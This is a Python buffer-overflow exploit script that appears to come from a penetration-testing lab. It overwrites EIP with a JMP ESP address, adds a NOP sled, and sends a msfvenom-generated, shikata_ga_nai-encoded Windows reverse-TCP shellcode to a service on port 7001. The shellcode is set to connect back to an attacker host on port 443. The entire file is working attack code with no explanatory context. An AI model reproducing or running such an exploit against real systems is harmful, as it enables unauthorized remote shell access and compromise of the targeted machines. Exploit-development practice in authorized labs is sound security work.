#!/usr/bin/python
import socket
import sys

print("\nSending evil buffer...")

# EIP at 2288 bytes
# JMP ESP at 0x148010CF :: 14 80 10 CF :: CF 10 80 14 ::  \xCF\x10\x80\x14 
filler = b'A' * 2288
eip = b'\xCF\x10\x80\x14'
offset = b'C' * 8
nops = b'\x90' * 12

# bad chars \x00

# msfvenom -p windows/shell_reverse_tcp LHOST=10.7.0.16 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00"
# Payload size: 351 bytes
# Final size of python file: 1712 bytes
buf =  b""
buf += b"\xd9\xc9\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbe\x39"
buf += b"\xdc\x5c\x3e\x83\xc2\x04\x31\x72\x13\x03\x4b\xcf\xbe"
buf += b"\xcb\x57\x07\xbc\x34\xa7\xd8\xa1\xbd\x42\xe9\xe1\xda"
buf += b"\x07\x5a\xd2\xa9\x45\x57\x99\xfc\x7d\xec\xef\x28\x72"
buf += b"\x45\x45\x0f\xbd\x56\xf6\x73\xdc\xd4\x05\xa0\x3e\xe4"
buf += b"\xc5\xb5\x3f\x21\x3b\x37\x6d\xfa\x37\xea\x81\x8f\x02"
buf += b"\x37\x2a\xc3\x83\x3f\xcf\x94\xa2\x6e\x5e\xae\xfc\xb0"
buf += b"\x61\x63\x75\xf9\x79\x60\xb0\xb3\xf2\x52\x4e\x42\xd2"
buf += b"\xaa\xaf\xe9\x1b\x03\x42\xf3\x5c\xa4\xbd\x86\x94\xd6"
buf += b"\x40\x91\x63\xa4\x9e\x14\x77\x0e\x54\x8e\x53\xae\xb9"
buf += b"\x49\x10\xbc\x76\x1d\x7e\xa1\x89\xf2\xf5\xdd\x02\xf5"
buf += b"\xd9\x57\x50\xd2\xfd\x3c\x02\x7b\xa4\x98\xe5\x84\xb6"
buf += b"\x42\x59\x21\xbd\x6f\x8e\x58\x9c\xe7\x63\x51\x1e\xf8"
buf += b"\xeb\xe2\x6d\xca\xb4\x58\xf9\x66\x3c\x47\xfe\x89\x17"
buf += b"\x3f\x90\x77\x98\x40\xb9\xb3\xcc\x10\xd1\x12\x6d\xfb"
buf += b"\x21\x9a\xb8\xac\x71\x34\x13\x0d\x21\xf4\xc3\xe5\x2b"
buf += b"\xfb\x3c\x15\x54\xd1\x54\xbc\xaf\xb2\x50\x46\xaf\x52"
buf += b"\x0d\x4a\xaf\x53\x76\xc3\x49\x39\x98\x82\xc2\xd6\x01"
buf += b"\x8f\x98\x47\xcd\x05\xe5\x48\x45\xaa\x1a\x06\xae\xc7"
buf += b"\x08\xff\x5e\x92\x72\x56\x60\x08\x1a\x34\xf3\xd7\xda"
buf += b"\x33\xe8\x4f\x8d\x14\xde\x99\x5b\x89\x79\x30\x79\x50"
buf += b"\x1f\x7b\x39\x8f\xdc\x82\xc0\x42\x58\xa1\xd2\x9a\x61"
buf += b"\xed\x86\x72\x34\xbb\x70\x35\xee\x0d\x2a\xef\x5d\xc4"
buf += b"\xba\x76\xae\xd7\xbc\x76\xfb\xa1\x20\xc6\x52\xf4\x5f"
buf += b"\xe7\x32\xf0\x18\x15\xa3\xff\xf3\x9d\xd3\xb5\x59\xb7"
buf += b"\x7b\x10\x08\x85\xe1\xa3\xe7\xca\x1f\x20\x0d\xb3\xdb"
buf += b"\x38\x64\xb6\xa0\xfe\x95\xca\xb9\x6a\x99\x79\xb9\xbe"

shellcode = buf

buffer = filler + eip + offset + nops + shellcode

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.10.6', 7001))
    s.send(buffer)
    s.close()
  
    print("\nDone!")
  
except:
    print("\nCould not connect!")

